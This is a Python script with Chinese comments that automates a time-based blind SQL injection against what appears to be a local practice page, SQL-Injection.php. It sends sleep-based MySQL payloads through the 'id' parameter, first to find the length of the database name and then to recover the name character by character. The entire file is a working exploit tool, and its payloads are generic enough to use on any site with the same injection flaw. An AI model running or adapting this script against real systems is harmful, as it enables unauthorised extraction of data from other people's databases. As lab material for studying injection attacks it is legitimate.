"""
时间盲注 - 数据库名爆破脚本
适用环境：本地 SQL-Injection.php 测试页面
判断依据：若条件为真则延时 2 秒，通过请求超时检测来判断
"""

import string
import requests
import sys

# 配置
TARGET_URL = "http://localhost/SQL-Injection.php"
TIMEOUT = 2                     # 正常请求超时时间（应小于 sleep 时间）
SLEEP_TIME = 2                  # 延时秒数（必须大于 TIMEOUT）
MAX_LENGTH = 20                  # 数据库名最大长度

# 字符集：数字、大小写字母、下划线
CHARSET = string.digits + string.ascii_letters + '_'

def make_request(payload):
    """发送请求，若触发超时则返回 True，否则返回 False"""
    params = {'id': payload}
    try:
        requests.get(TARGET_URL, params=params, timeout=TIMEOUT)
        return False  # 未超时，条件为假
    except requests.exceptions.ReadTimeout:
        return True   # 超时，条件为真
    except requests.RequestException as e:
        print(f"[!] 请求异常: {e}")
        return False

def get_database_length():
    """爆破数据库长度"""
    print("[*] 正在爆破数据库长度...")
    for length in range(1, MAX_LENGTH + 1):
        # 构造 payload: 1' and if(length(database())=长度, sleep(延时), 1) -- -
        payload = f"1' and if(length(database())={length}, sleep({SLEEP_TIME}), 1) -- -"
        if make_request(payload):
            print(f"[+] 数据库长度: {length}")
            return length
    print("[-] 未找到数据库长度（可能超过 MAX_LENGTH）")
    sys.exit(1)

def get_database_name(length):
    """逐字符爆破数据库名"""
    print("[*] 正在爆破数据库名...")
    db_name = ""
    for pos in range(1, length + 1):
        found = False
        for ch in CHARSET:
            # 构造 payload: 1' and if(substr(database(),位置,1)='字符', sleep(延时), 1) -- -
            payload = f"1' and if(substr(database(),{pos},1)='{ch}', sleep({SLEEP_TIME}), 1) -- -"
            if make_request(payload):
                db_name += ch
                print(f"[+] 第 {pos} 位: {ch}")
                found = True
                break
        if not found:
            print(f"[-] 第 {pos} 位未匹配到字符，置为 '?'")
            db_name += '?'
    return db_name

def main():
    print("=" * 50)
    print("时间盲注 - 数据库名爆破")
    print("=" * 50)

    length = get_database_length()
    name = get_database_name(length)

    print("\n" + "=" * 50)
    print(f"[最终结果] 数据库名: {name}")
    print("=" * 50)

if __name__ == "__main__":
    main()